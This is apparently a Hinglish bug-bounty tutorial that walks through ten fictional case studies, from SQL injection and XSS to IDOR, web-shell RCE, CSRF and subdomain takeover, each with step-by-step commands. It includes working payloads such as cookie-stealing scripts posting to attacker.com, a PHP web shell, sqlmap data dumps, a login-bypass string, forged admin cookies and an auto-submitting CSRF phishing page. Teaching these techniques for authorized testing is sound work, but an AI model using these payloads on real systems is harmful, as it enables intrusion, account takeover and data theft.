# 🎯 Practical Case Studies & Real Scenarios
## Bug Hunting ke Real Examples with Step-by-Step Solutions

---

# 📚 Table of Contents

1. [E-commerce Platform SQL Injection](#case-1-e-commerce-sql-injection)
2. [Social Media XSS Vulnerability](#case-2-social-media-xss)
3. [Banking App IDOR Attack](#case-3-banking-idor)
4. [Corporate Website RCE](#case-4-corporate-rce)
5. [Mobile App API Vulnerability](#case-5-mobile-api)
6. [Cloud Storage Misconfiguration](#case-6-cloud-storage)
7. [Authentication Bypass](#case-7-auth-bypass)
8. [File Upload Vulnerability](#case-8-file-upload)
9. [CSRF in Admin Panel](#case-9-csrf-admin)
10. [Subdomain Takeover](#case-10-subdomain-takeover)

---

# Case 1: E-commerce Platform SQL Injection 🛒

## Target: ShopKaro.com (Fictional)

### Background
Ye ek popular Indian e-commerce website thi jo electronics bechti thi. Main unke product search functionality test kar raha tha.

### Discovery Process

**Step 1: Initial Reconnaissance**
```bash
# Subdomain discovery
subfinder -d shopkaro.com -o subs.txt
# Results: www, api, admin, dev, staging

# Technology detection
whatweb shopkaro.com
# Result: PHP 7.2, MySQL, Apache 2.4, jQuery
```

**Step 2: Parameter Discovery**
```bash
# URL collection
waybackurls shopkaro.com | grep -E "\?" > urls_with_params.txt

# Found interesting URL:
# https://shopkaro.com/search.php?category=electronics&price_min=1000&price_max=50000
```

**Step 3: Manual Testing**
```bash
# Basic SQL injection test
curl "https://shopkaro.com/search.php?category=electronics'&price_min=1000&price_max=50000"

# Error message mila:
# "MySQL Error: You have an error in your SQL syntax near 'electronics'' at line 1"
```

**Step 4: Exploitation**
```bash
# Database enumeration
sqlmap -u "https://shopkaro.com/search.php?category=electronics&price_min=1000&price_max=50000" -p category --dbs

# Results:
# - shopkaro_main
# - shopkaro_users
# - shopkaro_orders

# Table enumeration
sqlmap -u "https://shopkaro.com/search.php?category=electronics&price_min=1000&price_max=50000" -p category -D shopkaro_users --tables

# Found tables:
# - users
# - admin_users
# - payment_details
```

**Step 5: Data Extraction**
```bash
# User data extraction
sqlmap -u "https://shopkaro.com/search.php?category=electronics&price_min=1000&price_max=50000" -p category -D shopkaro_users -T users --dump

# Retrieved:
# - 50,000+ user records
# - Email addresses
# - Hashed passwords (MD5 - weak!)
# - Phone numbers
# - Addresses
```

### Impact
- **Severity**: Critical
- **CVSS Score**: 9.8
- **Data Compromised**: 50,000+ user records
- **Business Impact**: ₹2 crore potential loss

### Remediation
```php
// Vulnerable code:
$query = "SELECT * FROM products WHERE category='" . $_GET['category'] . "'";

// Fixed code:
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = ?");
$stmt->execute([$_GET['category']]);
```

---

# Case 2: Social Media XSS Vulnerability 📱

## Target: DesiConnect.in (Fictional)

### Background
Ye ek Indian social networking site thi jahan log apne thoughts share karte the. Main profile section test kar raha tha.

### Discovery Process

**Step 1: Profile Testing**
```bash
# Profile URL structure analysis
https://desiconnect.in/profile.php?user=john123

# Bio section mein XSS test kiya
Bio field: <script>alert('XSS by Hacker')</script>
```

**Step 2: Payload Refinement**
```javascript
// Basic payload blocked tha, WAF bypass kiya
<img src=x onerror=alert('XSS')>

// Ye bhi block hua, advanced payload try kiya
<svg onload=alert('XSS')>

// Finally successful payload:
<details open ontoggle=alert('XSS')>
```

**Step 3: Impact Assessment**
```javascript
// Cookie stealing payload
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

// Session hijacking payload
<script>
fetch('http://attacker.com/log.php', {
  method: 'POST',
  body: 'cookie=' + document.cookie + '&url=' + window.location
});
</script>
```

### Real Attack Scenario
```html
<!-- Malicious profile bio -->
<img src=x onerror="
var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/friend-request', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
  'target_user': 'attacker123',
  'action': 'send_request'
}));
">
```

### Impact
- **Severity**: High
- **Affected Users**: Anyone viewing the profile
- **Potential Damage**: Account takeover, data theft
- **Business Impact**: User trust loss

---

# Case 3: Banking App IDOR Attack 🏦

## Target: SecureBank Mobile App (Fictional)

### Background
Ye ek banking app tha jo account balance aur transaction history show karta tha. Main API endpoints test kar raha tha.

### Discovery Process

**Step 1: Traffic Interception**
```bash
# Burp Suite se mobile app traffic capture kiya
# API endpoint mila:
GET /api/v1/account/balance/12345
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
```

**Step 2: IDOR Testing**
```bash
# Account number change kiya
GET /api/v1/account/balance/12346
# Response: {"balance": "₹2,50,000", "account_holder": "Rahul Sharma"}

GET /api/v1/account/balance/12347
# Response: {"balance": "₹15,75,000", "account_holder": "Priya Singh"}
```

**Step 3: Automation Script**
```python
import requests
import json

# Account enumeration script
base_url = "https://securebank.com/api/v1/account/balance/"
headers = {
    "Authorization": "Bearer YOUR_TOKEN_HERE",
    "Content-Type": "application/json"
}

for account_id in range(10000, 99999):
    url = base_url + str(account_id)
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        print(f"Account: {account_id}")
        print(f"Balance: {data['balance']}")
        print(f"Holder: {data['account_holder']}")
        print("-" * 30)
```

### Impact
- **Severity**: Critical
- **Data Exposed**: All customer account balances
- **Regulatory Impact**: RBI compliance violation
- **Financial Impact**: ₹50 crore+ potential fraud

---

# Case 4: Corporate Website RCE 💻

## Target: TechCorp.co.in (Fictional)

### Background
Ye ek IT company ki website thi jo file upload functionality provide karti thi employees ke liye.

### Discovery Process

**Step 1: File Upload Analysis**
```bash
# Upload endpoint discovery
gobuster dir -u https://techcorp.co.in -w /usr/share/wordlists/dirb/common.txt
# Found: /upload, /files, /documents
```

**Step 2: File Type Testing**
```bash
# PHP file upload attempt
echo "<?php system(\$_GET['cmd']); ?>" > shell.php

# Upload blocked, extension bypass try kiya
mv shell.php shell.php.jpg
# Still blocked

# Double extension bypass
mv shell.php.jpg shell.jpg.php
# Success!
```

**Step 3: Web Shell Access**
```bash
# Web shell access
curl "https://techcorp.co.in/uploads/shell.jpg.php?cmd=whoami"
# Response: www-data

curl "https://techcorp.co.in/uploads/shell.jpg.php?cmd=ls -la"
# Response: Directory listing with sensitive files
```

**Step 4: Privilege Escalation**
```bash
# System information gathering
curl "https://techcorp.co.in/uploads/shell.jpg.php?cmd=uname -a"
# Linux techcorp-server 4.15.0-45-generic

# Database credentials search
curl "https://techcorp.co.in/uploads/shell.jpg.php?cmd=find / -name config.php 2>/dev/null"
# Found: /var/www/html/config.php

# Database access
curl "https://techcorp.co.in/uploads/shell.jpg.php?cmd=cat /var/www/html/config.php"
# MySQL credentials retrieved
```

### Impact
- **Severity**: Critical
- **Server Access**: Complete system compromise
- **Data at Risk**: Customer database, source code
- **Business Impact**: Complete business shutdown

---

# Case 5: Mobile App API Vulnerability 📱

## Target: FoodDelivery App (Fictional)

### Background
Ye ek food delivery app tha jo API se orders manage karta tha. Main payment flow test kar raha tha.

### Discovery Process

**Step 1: API Endpoint Discovery**
```bash
# Mobile app reverse engineering
apktool d fooddelivery.apk
grep -r "api" fooddelivery/

# Found endpoints:
# /api/v2/orders/create
# /api/v2/payment/process
# /api/v2/user/profile
```

**Step 2: Payment Manipulation**
```json
// Original payment request
POST /api/v2/payment/process
{
  "order_id": "ORD123456",
  "amount": 500,
  "currency": "INR",
  "payment_method": "card"
}

// Manipulated request (amount change)
{
  "order_id": "ORD123456",
  "amount": 1,
  "currency": "INR",
  "payment_method": "card"
}
```

**Step 3: Race Condition Testing**
```python
import requests
import threading
import time

def place_order():
    url = "https://fooddelivery.com/api/v2/orders/create"
    data = {
        "restaurant_id": "REST123",
        "items": [{"id": "ITEM1", "quantity": 1}],
        "coupon_code": "FIRST50"  # 50% discount coupon
    }
    response = requests.post(url, json=data, headers=headers)
    print(f"Response: {response.status_code}")

# Multiple threads se same coupon use kiya
threads = []
for i in range(10):
    t = threading.Thread(target=place_order)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### Impact
- **Severity**: High
- **Financial Loss**: ₹10 lakh+ in fraudulent orders
- **Business Logic**: Coupon system completely broken
- **User Impact**: Legitimate users affected

---

# Case 6: Cloud Storage Misconfiguration ☁️

## Target: StartupFiles.s3.amazonaws.com (Fictional)

### Background
Ye ek startup company ka AWS S3 bucket tha jo publicly accessible tha.

### Discovery Process

**Step 1: Bucket Discovery**
```bash
# Subdomain enumeration se S3 bucket mila
subfinder -d startup.com | grep s3
# Result: startupfiles.s3.amazonaws.com

# Bucket access test
aws s3 ls s3://startupfiles --no-sign-request
# Success! Bucket publicly readable
```

**Step 2: Data Enumeration**
```bash
# Complete bucket listing
aws s3 sync s3://startupfiles . --no-sign-request

# Found sensitive files:
# - database_backup.sql (50MB)
# - user_data_export.csv (100MB)
# - api_keys.txt
# - employee_details.xlsx
# - financial_reports/
```

**Step 3: Sensitive Data Analysis**
```bash
# Database backup analysis
grep -i "password" database_backup.sql | head -10
# Found 10,000+ user password hashes

# API keys analysis
cat api_keys.txt
# AWS_ACCESS_KEY_ID=AKIA...
# AWS_SECRET_ACCESS_KEY=...
# STRIPE_SECRET_KEY=sk_live_...
# RAZORPAY_KEY_SECRET=...
```

### Impact
- **Severity**: Critical
- **Data Exposed**: Complete customer database
- **Financial Keys**: Payment gateway access
- **Compliance**: GDPR/PCI DSS violation

---

# Case 7: Authentication Bypass 🔐

## Target: AdminPanel.company.com (Fictional)

### Background
Ye ek company ka admin panel tha jo employee management ke liye use hota tha.

### Discovery Process

**Step 1: Login Page Analysis**
```bash
# Admin panel discovery
gobuster dir -u https://company.com -w /usr/share/wordlists/dirb/common.txt
# Found: /admin, /administrator, /panel
```

**Step 2: Authentication Testing**
```bash
# SQL injection in login
Username: admin' OR '1'='1'--
Password: anything

# Response: Login successful!
# Bypassed authentication completely
```

**Step 3: Session Analysis**
```bash
# Cookie analysis
Cookie: session_id=eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==

# Base64 decode
echo "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==" | base64 -d
# Result: {"user":"admin","role":"admin"}

# Cookie manipulation
echo '{"user":"superadmin","role":"superadmin"}' | base64
# New cookie: eyJ1c2VyIjoic3VwZXJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIn0=
```

### Impact
- **Severity**: Critical
- **Access Level**: Complete admin access
- **Data at Risk**: All employee data
- **System Control**: Full system administration

---

# Case 8: File Upload Vulnerability 📁

## Target: ResumePortal.in (Fictional)

### Background
Ye ek job portal tha jahan candidates apne resume upload kar sakte the.

### Discovery Process

**Step 1: Upload Functionality Testing**
```bash
# Normal file upload
curl -X POST -F "resume=@resume.pdf" https://resumeportal.in/upload

# PHP file upload attempt
echo "<?php phpinfo(); ?>" > info.php
curl -X POST -F "resume=@info.php" https://resumeportal.in/upload
# Blocked: "Only PDF files allowed"
```

**Step 2: Bypass Techniques**
```bash
# MIME type bypass
curl -X POST -F "resume=@info.php" -H "Content-Type: application/pdf" https://resumeportal.in/upload

# Magic bytes bypass
printf "\x25\x50\x44\x46<?php phpinfo(); ?>" > malicious.pdf
curl -X POST -F "resume=@malicious.pdf" https://resumeportal.in/upload

# Double extension bypass
mv info.php info.pdf.php
curl -X POST -F "resume=@info.pdf.php" https://resumeportal.in/upload
```

**Step 3: Web Shell Deployment**
```php
// Advanced web shell
<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}

if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded: " . $_FILES['file']['name'];
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

### Impact
- **Severity**: Critical
- **Server Access**: Remote code execution
- **Data Risk**: All user resumes and data
- **Business Impact**: Complete platform compromise

---

# Case 9: CSRF in Admin Panel 🔄

## Target: BlogManagement.com (Fictional)

### Background
Ye ek blog management platform tha jahan admins articles publish kar sakte the.

### Discovery Process

**Step 1: Admin Functionality Analysis**
```bash
# Admin actions discovery
# POST /admin/create-user
# POST /admin/delete-user
# POST /admin/change-password
# POST /admin/publish-article
```

**Step 2: CSRF Token Analysis**
```html
<!-- Login form -->
<form method="POST" action="/admin/create-user">
    <input type="text" name="username" required>
    <input type="email" name="email" required>
    <input type="password" name="password" required>
    <input type="submit" value="Create User">
    <!-- No CSRF token! -->
</form>
```

**Step 3: CSRF Exploit Creation**
```html
<!-- Malicious page: csrf_exploit.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone Giveaway!</title>
</head>
<body>
    <h1>Congratulations! You won a free iPhone!</h1>
    <p>Click the button below to claim your prize:</p>
    
    <!-- Hidden CSRF form -->
    <form id="maliciousForm" method="POST" action="https://blogmanagement.com/admin/create-user" style="display:none;">
        <input type="text" name="username" value="hacker123">
        <input type="email" name="email" value="hacker@evil.com">
        <input type="password" name="password" value="hacked123">
        <input type="hidden" name="role" value="admin">
    </form>
    
    <button onclick="document.getElementById('maliciousForm').submit();">Claim Prize!</button>
    
    <!-- Auto-submit after 3 seconds -->
    <script>
        setTimeout(function() {
            document.getElementById('maliciousForm').submit();
        }, 3000);
    </script>
</body>
</html>
```

### Attack Scenario
```bash
# Attack flow:
# 1. Admin user logged in to BlogManagement.com
# 2. Admin visits malicious site (csrf_exploit.html)
# 3. Hidden form automatically submits
# 4. New admin user "hacker123" created
# 5. Attacker gains admin access
```

### Impact
- **Severity**: High
- **Access Gained**: Admin privileges
- **User Impact**: Unauthorized actions performed
- **Business Risk**: Content manipulation, data theft

---

# Case 10: Subdomain Takeover 🌐

## Target: blog.techstartup.com (Fictional)

### Background
Ye ek tech startup ka blog subdomain tha jo GitHub Pages pe hosted tha but misconfigured tha.

### Discovery Process

**Step 1: Subdomain Discovery**
```bash
# Subdomain enumeration
subfinder -d techstartup.com -o subdomains.txt

# Found subdomains:
# www.techstartup.com
# api.techstartup.com
# blog.techstartup.com
# dev.techstartup.com
```

**Step 2: DNS Analysis**
```bash
# DNS lookup
dig blog.techstartup.com
# Result: CNAME pointing to techstartup.github.io

# GitHub Pages check
curl -I https://techstartup.github.io
# Response: 404 - Repository not found
```

**Step 3: Takeover Attempt**
```bash
# GitHub repository creation
# Created repository: techstartup.github.io
# Added index.html with proof of concept

# Verification
curl https://blog.techstartup.com
# Success! Our content is now served
```

**Step 4: Impact Demonstration**
```html
<!-- Malicious content served from blog.techstartup.com -->
<!DOCTYPE html>
<html>
<head>
    <title>TechStartup Blog - Hacked!</title>
</head>
<body>
    <h1>This subdomain has been taken over!</h1>
    <p>Proof of concept by Security Researcher</p>
    
    <!-- Cookie stealing script -->
    <script>
        // Steal cookies from main domain
        if(document.cookie) {
            fetch('https://attacker.com/log.php', {
                method: 'POST',
                body: 'cookies=' + document.cookie + '&domain=' + window.location.hostname
            });
        }
    </script>
</body>
</html>
```

### Impact
- **Severity**: Medium to High
- **Brand Damage**: Company reputation at risk
- **Phishing Risk**: Users can be deceived
- **Cookie Theft**: Session hijacking possible

---

# 🎯 Key Learnings from Real Cases

## Common Patterns
1. **Input Validation**: 80% vulnerabilities input validation ki wajah se
2. **Authentication Flaws**: Weak session management common hai
3. **Authorization Issues**: IDOR vulnerabilities everywhere
4. **Configuration Errors**: Cloud misconfigurations increasing

## Detection Techniques
1. **Automated Scanning**: Tools se initial discovery
2. **Manual Testing**: Critical vulnerabilities manual testing se milte hain
3. **Code Review**: Source code analysis important hai
4. **Business Logic**: Application flow samjhna zaroori hai

## Exploitation Strategies
1. **Chain Vulnerabilities**: Multiple small issues combine karo
2. **Persistence**: Access maintain karne ke ways dhundo
3. **Privilege Escalation**: Higher privileges gain karne ki koshish karo
4. **Data Exfiltration**: Sensitive data safely extract karo

## Reporting Best Practices
1. **Clear Impact**: Business impact clearly explain karo
2. **Reproduction Steps**: Step-by-step reproduction guide do
3. **Proof of Concept**: Working PoC provide karo
4. **Remediation**: Fix suggestions bhi do

---

# 🔧 Tools Used in These Cases

## Reconnaissance
- **Subfinder**: Subdomain discovery
- **Amass**: Asset discovery
- **Waybackurls**: Historical URLs
- **Httpx**: HTTP probing

## Vulnerability Assessment
- **Nuclei**: Automated vulnerability scanning
- **SQLMap**: SQL injection testing
- **Burp Suite**: Web application testing
- **Gobuster**: Directory bruteforcing

## Exploitation
- **Custom Scripts**: Python/Bash automation
- **Metasploit**: Exploitation framework
- **Web Shells**: Remote access
- **Social Engineering**: Human factor exploitation

## Mobile Testing
- **APKTool**: Android app reverse engineering
- **Frida**: Dynamic analysis
- **MobSF**: Mobile security framework
- **Objection**: Runtime mobile exploration

---

# 💡 Pro Tips for Real-World Testing

## Before Starting
1. **Scope Define Karo**: Kya test kar sakte ho, kya nahi
2. **Legal Authorization**: Written permission lena zaroori hai
3. **Backup Plan**: Agar kuch galat ho jaye to kya karoge
4. **Documentation**: Har step record karo

## During Testing
1. **Low and Slow**: Aggressive scanning se bachho
2. **Multiple Vectors**: Different attack angles try karo
3. **False Positives**: Results manually verify karo
4. **Impact Assessment**: Vulnerability ka real impact samjho

## After Discovery
1. **Responsible Disclosure**: Company ko pehle inform karo
2. **Proof of Concept**: Working PoC banao
3. **Business Impact**: Financial/reputation impact explain karo
4. **Remediation Help**: Fix karne mein help karo

---

# 🎉 Conclusion

Ye real case studies tumhe practical experience dete hain ki actual bug hunting kaise hoti hai. Remember:

1. **Practice Makes Perfect**: Ye scenarios practice karo
2. **Stay Updated**: New techniques seekhte raho
3. **Be Ethical**: Hamesha legal boundaries mein raho
4. **Help Community**: Knowledge share karo

**Happy Hunting! 🐛🔍**

---

*"Real-world experience is the best teacher. These case studies are your stepping stones to becoming an elite bug hunter!"*